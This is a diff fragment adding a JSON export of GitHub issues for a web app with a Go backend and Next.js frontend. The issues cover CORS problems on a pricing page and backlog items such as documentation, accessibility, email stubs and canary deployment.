+        "body": "# Frontend: Manual sync suggestion shown incorrectly\r\n\r\n**Labels:** frontend, user-experience\r\n\r\n## Error\r\n```\r\n[Pricing] Try manually syncing: POST /api/v1/billing/sync-products\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:83:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:131:18)\r\n```\r\n\r\n## Issue\r\nMisleading suggestion - manual sync won't help if CORS blocks the frontend request.\r\n\r\n## Suggested Improvement\r\nOnly show sync suggestion if API actually returns 200 OK but with empty/wrong data.\r\n\r\nUpdate the error handling logic in `frontend/src/app/pricing/page.tsx` to:\r\n1. Check if the fetch failed due to network/CORS issues\r\n2. Only suggest manual sync if the API returns successfully but with incorrect data\r\n3. Provide different error messages for different failure scenarios\r\n",
+        "labels": [],
+        "number": 41,
+        "title": "Frontend: Manual sync suggestion shown incorrectly"
+    },
+    {
+        "body": "# Frontend: Misleading Polar API sync warning message\r\n\r\n**Labels:** frontend, documentation, user-experience\r\n\r\n## Error\r\n```\r\n[Pricing] This may indicate a sync issue with Polar API\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:82:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:131:18)\r\n```\r\n\r\n## Issue\r\nError message suggests Polar API sync problem, but actual issue is CORS blocking requests.\r\n\r\n## Suggested Improvement\r\nUpdate error message in `frontend/src/app/pricing/page.tsx:82` to:\r\n```typescript\r\nconsole.error('[Pricing] Failed to load products. Check network tab for CORS or API errors.');\r\n```\r\n\r\nThis would provide more actionable debugging information to developers.\r\n",
+        "labels": [],
+        "number": 40,
+        "title": "Frontend: Misleading Polar API sync warning message"
+    },
+    {
+        "body": "# Frontend: Empty products array returned from API\r\n\r\n**Labels:** bug, frontend, api\r\n\r\n## Error\r\n```\r\n[Pricing] Available products: []\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:81:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:131:18)\r\n```\r\n\r\n## Root Cause\r\nCORS preflight rejection causes fetch to fail, returning empty array instead of 3 products.\r\n\r\n## Verification\r\nBackend API works correctly:\r\n```bash\r\ncurl http://localhost:8080/api/v1/products\r\n# Returns: {\"products\":[...3 products...]}\r\n```\r\n\r\n## Fix\r\n\u00e2\u0153\u2026 **FIXED:** Added `http://localhost:8080` to CORS allowed origins in `internal/middleware/cors.go`\r\n\r\nSame as Issue #1 - CORS configuration fix resolves this issue.\r\n",
+        "labels": [],
+        "number": 39,
+        "title": "Frontend: Empty products array returned from API"
+    },
+    {
+        "body": "# Frontend: No product found for plan type 'premium' in pricing page\r\n\r\n**Labels:** bug, frontend, polar-integration\r\n\r\n## Error\r\n```\r\n[Pricing] No product found for plan type: premium\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:80:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:131:18)\r\n```\r\n\r\n## Root Cause\r\nCORS configuration blocks frontend API requests from `http://localhost:8080` origin.\r\n\r\n## Expected Behavior\r\nPro plan should find product with ID `1216afa1-650c-4dda-95cd-7010dbb03404` and `plan_type: \"premium\"`\r\n\r\n## Fix\r\n\u00e2\u0153\u2026 **FIXED:** Added `http://localhost:8080` to CORS allowed origins in `internal/middleware/cors.go`\r\n\r\nAfter this fix is deployed, the pricing page should successfully load products from the API.\r\n",
+        "labels": [],
+        "number": 38,
+        "title": "Frontend: No product found for plan type 'premium' in pricing page"
+    },
+    {
+        "body": "Description: Missing troubleshooting guide, migration guide, secret rotation procedures. Incomplete environment configuration templates and API documentation.",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHG5g",
+                "name": "low",
+                "description": "Low priority - backlog",
+                "color": "0e8a16"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHR8A",
+                "name": "docs",
+                "description": "Documentation",
+                "color": "d4c5f9"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHctA",
+                "name": "medium-effort",
+                "description": "Medium effort (1-2 days)",
+                "color": "5319e7"
+            }
+        ],
+        "number": 34,
+        "title": "[LOW] Complete Documentation Gaps"
+    },
+    {
+        "body": "Description: README.md missing troubleshooting section with common issues",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHG5g",
+                "name": "low",
+                "description": "Low priority - backlog",
+                "color": "0e8a16"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHR8A",
+                "name": "docs",
+                "description": "Documentation",
+                "color": "d4c5f9"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHZZg",
+                "name": "quick-win",
+                "description": "Can be done quickly",
+                "color": "bfd4f2"
+            }
+        ],
+        "number": 33,
+        "title": "[LOW] Create Comprehensive Troubleshooting Guide"
+    },
+    {
+        "body": "Description: Missing ARIA labels on interactive elements. No ARIA state indicators on loading states.",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHG5g",
+                "name": "low",
+                "description": "Low priority - backlog",
+                "color": "0e8a16"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHZGQ",
+                "name": "a11y",
+                "description": "Accessibility",
+                "color": "7057ff"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHctA",
+                "name": "medium-effort",
+                "description": "Medium effort (1-2 days)",
+                "color": "5319e7"
+            }
+        ],
+        "number": 32,
+        "title": "[LOW] Add ARIA Labels and Accessibility Improvements"
+    },
+    {
+        "body": "Description: AWS CloudFront and Fastly integrations marked as TODO in internal/services/cdn_cache_invalidation.go lines 184, 194",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHG5g",
+                "name": "low",
+                "description": "Low priority - backlog",
+                "color": "0e8a16"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRGQ",
+                "name": "backend",
+                "description": "Backend Go code",
+                "color": "0052cc"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHc-w",
+                "name": "large-effort",
+                "description": "Large effort (> 2 days)",
+                "color": "0e8a16"
+            }
+        ],
+        "number": 30,
+        "title": "[LOW] Implement CDN Cache Invalidation"
+    },
+    {
+        "body": "Description: UpdateProfile, ChangePassword, Logout marked as coming soon in internal/handlers/auth.go lines 214, 241, 256",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHG5g",
+                "name": "low",
+                "description": "Low priority - backlog",
+                "color": "0e8a16"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRGQ",
+                "name": "backend",
+                "description": "Backend Go code",
+                "color": "0052cc"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHctA",
+                "name": "medium-effort",
+                "description": "Medium effort (1-2 days)",
+                "color": "5319e7"
+            }
+        ],
+        "number": 29,
+        "title": "[LOW] Complete Authentication Methods"
+    },
+    {
+        "body": "Description: Direct production deployment without gradual rollout in .github/workflows/ci-cd.yml",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHEEQ",
+                "name": "medium",
+                "description": "Medium priority - schedule for sprint",
+                "color": "fbca04"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRpQ",
+                "name": "infra",
+                "description": "Infrastructure & deployment",
+                "color": "1d76db"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHc-w",
+                "name": "large-effort",
+                "description": "Large effort (> 2 days)",
+                "color": "0e8a16"
+            }
+        ],
+        "number": 25,
+        "title": "[MEDIUM] Implement Canary Deployment Strategy"
+    },
+    {
+        "body": "Description: All email methods in internal/services/email.go are stubs with TODO comments",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHEEQ",
+                "name": "medium",
+                "description": "Medium priority - schedule for sprint",
+                "color": "fbca04"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRGQ",
+                "name": "backend",
+                "description": "Backend Go code",
+                "color": "0052cc"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHc-w",
+                "name": "large-effort",
+                "description": "Large effort (> 2 days)",
+                "color": "0e8a16"
+            }
+        ],
+        "number": 21,
+        "title": "[MEDIUM] Implement Email Service Integration"
+    }
+]
